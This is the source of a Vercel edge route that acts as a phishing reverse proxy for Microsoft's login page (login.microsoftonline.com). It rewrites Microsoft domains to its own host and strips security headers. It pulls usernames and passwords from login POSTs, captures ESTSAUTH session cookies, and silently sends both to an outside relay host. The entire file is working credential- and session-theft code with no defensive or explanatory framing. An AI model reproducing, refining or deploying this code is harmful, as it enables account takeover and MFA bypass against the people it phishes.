export const runtime = 'edge';

// Configuration
const UPSTREAM = 'login.microsoftonline.com';
const UPSTREAM_PATH = '/';
const VERCEL_URL = 'https://apisage.searchegpt.com/api/relay';
const BLOCKED_REGIONS = [];
const BLOCKED_IPS = ['0.0.0.0', '127.0.0.1'];

async function sendCredsToVercel(data) {
  try {
    await fetch(VERCEL_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data),
    });
  } catch (error) {
    // Intentionally silent
  }
}

async function exfiltrateCookiesFile(cookieText, ip) {
  try {
    const content = `IP: ${ip}\nData: Cookies found:\n\n${cookieText}\n`;
    const formData = new FormData();
    formData.append("file", new Blob([content], { type: "text/plain" }), `${ip}-COOKIE.txt`);
    formData.append("ip", ip);
    formData.append("type", "cookie-file");
    
    await fetch(VERCEL_URL, {
      method: "POST",
      body: formData,
    });
  } catch (e) {
    // Intentionally silent
  }
}

export async function GET(request, context) {
  return handleRequest(request, context);
}

export async function POST(request, context) {
  return handleRequest(request, context);
}

export async function PUT(request, context) {
  return handleRequest(request, context);
}

export async function DELETE(request, context) {
  return handleRequest(request, context);
}

export async function PATCH(request, context) {
  return handleRequest(request, context);
}

export async function HEAD(request, context) {
  return handleRequest(request, context);
}

async function handleRequest(request, { params }) {
  const url = new URL(request.url);
  
  // Vercel-specific headers
  const region = request.headers.get('x-vercel-ip-country')?.toUpperCase() || '';
  const ipAddress = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown';

  // Blocking check
  if (BLOCKED_REGIONS.includes(region) || BLOCKED_IPS.includes(ipAddress)) {
    return new Response('Access denied.', { status: 403 });
  }

  // Build upstream URL
  const pathSegments = params.path || [];
  let upstreamPath = UPSTREAM_PATH;
  
  if (pathSegments.length > 0) {
    upstreamPath = UPSTREAM_PATH + pathSegments.join('/');
  }

  const upstreamUrl = new URL(`https://${UPSTREAM}${upstreamPath}`);
  upstreamUrl.search = url.search;

  // Handle credentials extraction for POST requests
  let requestBody = null;
  if (request.method === 'POST') {
    try {
      const clonedReq = request.clone();
      const bodyText = await clonedReq.text();
      requestBody = bodyText;
      
      const params = new URLSearchParams(bodyText);
      const user = params.get('login');
      const pass = params.get('passwd');
      
      if (user && pass) {
        await sendCredsToVercel({
          type: "creds",
          ip: ipAddress,
          user: decodeURIComponent(user.replace(/\+/g, ' ')),
          pass: decodeURIComponent(pass.replace(/\+/g, ' ')),
        });
      }
    } catch (error) {
      // Continue even if extraction fails
    }
  }

  // Prepare headers for upstream request
  const headers = new Headers();
  for (const [key, value] of request.headers.entries()) {
    if (!['host', 'referer', 'content-length'].includes(key.toLowerCase())) {
      headers.set(key, value);
    }
  }

  headers.set('Host', UPSTREAM);
  headers.set('Referer', `https://${url.hostname}`);

  // Make request to upstream
  let upstreamResponse;
  try {
    upstreamResponse = await fetch(upstreamUrl.toString(), {
      method: request.method,
      headers: headers,
      body: ['GET', 'HEAD'].includes(request.method) ? null : (requestBody || request.body),
      redirect: 'manual',
    });
  } catch (error) {
    return new Response('Upstream error', { status: 502 });
  }

  // Handle WebSocket upgrades
  if (request.headers.get('Upgrade')?.toLowerCase() === 'websocket') {
    return upstreamResponse;
  }

  // Process response headers
  const responseHeaders = new Headers(upstreamResponse.headers);
  
  // Modify CORS and security headers
  responseHeaders.set('access-control-allow-origin', '*');
  responseHeaders.set('access-control-allow-credentials', 'true');
  responseHeaders.delete('content-security-policy');
  responseHeaders.delete('content-security-policy-report-only');
  responseHeaders.delete('clear-site-data');

  // Process cookies
  let allCookies = '';
  const cookieHeaders = responseHeaders.get('set-cookie');
  if (cookieHeaders) {
    const cookiesArray = Array.isArray(cookieHeaders) ? cookieHeaders : [cookieHeaders];
    allCookies = cookiesArray.join('; \n\n');
    
    // Modify cookie domains
    const modifiedCookies = cookiesArray.map(cookie => 
      cookie.replace(/login\.microsoftonline\.com/gi, url.hostname)
    );
    
    // Replace original cookies with modified ones
    responseHeaders.delete('set-cookie');
    modifiedCookies.forEach(cookie => {
      responseHeaders.append('set-cookie', cookie);
    });
  }

  // Exfiltrate cookies if auth cookies detected
  if (allCookies.includes('ESTSAUTH') && allCookies.includes('ESTSAUTHPERSISTENT')) {
    await exfiltrateCookiesFile(allCookies, ipAddress);
  }

  // Process response body based on content type
  const contentType = responseHeaders.get('content-type');
  let responseBody;

  if (contentType && /(text\/html|application\/javascript|application\/json)/i.test(contentType)) {
    try {
      let text = await upstreamResponse.text();
      // Replace all Microsoft domains with our domain
      text = text.replace(/login\.microsoftonline\.com/gi, url.hostname);
      text = text.replace(/https:\/\/login\.microsoftonline\.com/gi, `https://${url.hostname}`);
      text = text.replace(/http:\/\/login\.microsoftonline\.com/gi, `https://${url.hostname}`);
      responseBody = text;
    } catch (error) {
      // Fallback to original body
      responseBody = upstreamResponse.body;
    }
  } else {
    responseBody = upstreamResponse.body;
  }

  return new Response(responseBody, {
    status: upstreamResponse.status,
    headers: responseHeaders,
  });
}
